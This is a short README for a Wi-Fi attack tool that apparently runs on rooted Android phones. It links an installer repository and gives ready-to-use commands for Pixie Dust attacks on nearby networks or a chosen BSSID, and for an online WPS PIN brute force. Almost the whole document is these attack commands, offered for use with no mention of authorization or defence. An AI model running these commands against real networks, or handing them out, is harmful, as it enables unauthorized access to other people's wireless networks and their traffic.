
# THBD
# Wifi_Hack
You Can H@ck Wifi With Your Rooted Android Device.
# Installation:
### Use Wifi_Hack_Installer Tool.
### Link:
```
https://github.com/Mahfuz-THBD/Wifi_Hack_Installer
```
### Usage examples
### Note:Your Device Must Be Rooted.
1st turn off your Wifi.

Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python birihack.py -i wlan0 -K
 ```

 Start Pixie Dust attack on a specified BSSID:
  
  
```
sudo python birihack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
```
Launch online WPS bruteforce with the specified first half of the PIN:

 ```
 sudo python birihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
### Troubleshooting
```
"Device or resource busy (-16)"
   Turn on Wifi and Then Turn off Wifi.
  ```
